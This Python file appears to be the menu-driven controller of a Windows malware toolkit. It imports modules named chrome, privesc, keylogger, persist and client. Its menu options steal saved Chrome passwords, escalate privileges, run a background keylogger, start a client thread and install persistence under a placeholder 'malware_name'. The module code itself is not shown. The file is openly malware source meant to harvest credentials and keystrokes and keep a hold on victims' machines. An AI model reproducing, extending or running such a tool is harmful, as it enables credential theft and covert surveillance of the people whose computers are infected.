import threading
import os
import subprocess
from _modules import chrome
from _modules import privesc
from _modules import keylogger
from _modules import persist
from _modules import client

def chromepass(filename="error.txt"):
    print("Getting Chrome passwords")
    chrome.get_pass()
    print(f"Chrome password gathering complete in file: {filename}")

def priv_esc_poc():
    privesc.excalate()

def keylogger_thread():
    def keylogger_start():
        keylogger.keylogg()
    t = threading.Thread(target=keylogger_start)
    t.daemon = True 
    t.start()

def client_thread():
    def client_start():
        client.run_client()
    t = threading.Thread(target=client_start)
    t.daemon = True 
    t.start()

def persistence():
    persist.persist_run("malware_name", "malware/path")
if __name__ == "__main__":
    modules = {
        "Browser Grab": chromepass,
        "Escalate": priv_esc_poc,
        "Keylogger": keylogger_thread,
        "Local Client": client_thread,
        "Persist": persistence
    }
    while True:
        for n, key in enumerate(modules):
            print(f"{n+1}: {key}")
        choice = input("Choose one: ")
        try:
            choice = int(choice)
            if choice > 0 and choice <= len(modules):
               modules[list(modules.keys())[choice-1]]()
            else:
                raise ValueError
        except ValueError:
            os.system("cls")
            print("Please choose a correct number!\n")
    